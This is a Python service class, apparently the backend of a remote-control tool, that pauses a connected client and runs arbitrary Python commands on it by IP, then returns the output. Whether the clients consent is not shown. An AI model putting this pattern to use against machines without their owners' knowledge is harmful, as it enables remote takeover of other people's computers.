from dataManager.repository.userRepository import UserRepository
import logging
import asyncio
from fastapi import HTTPException

class UserService:

    def __init__(self, user_repository: UserRepository, lock: asyncio.Lock):
        self.user_repository = user_repository
        self.lock = lock
    
    def getUsers(self):
        user_list = self.user_repository.get_user_list()
        
        for user in user_list:
            if "module_data" in user:
                del user["module_data"]
        
        return user_list
    
    
    async def executePythonShell(self, user_id, command):
        user = self.user_repository.get_user(user_id)
        
        if not user:
            raise HTTPException(status_code=404, detail="User not found")
        
        try:
            await user.send("print('pause||||||')")
        except Exception as e:
            logging.error(f"Error sending pause command to {user.ip} : {e}")
            raise HTTPException(status_code=400, detail=str(e))

        async with user.lock:
            
            try:
                logging.info(f"Executing command on {user.ip}")
                await user.send(command)
                logging.info(f"Executed command on {user.ip}")
                response = await user.receive()
                logging.info(f"Received response from {user.ip}: {response}")
            except Exception as e:
                logging.error(f"Error executing command on {user.ip} : {e}")
                raise HTTPException(status_code=400, detail=str(e))
            logging.info("Returning response")
            if response:
                return {
                    "output": f"{response.decode()}"
                }
            return {
                "output": ""
            }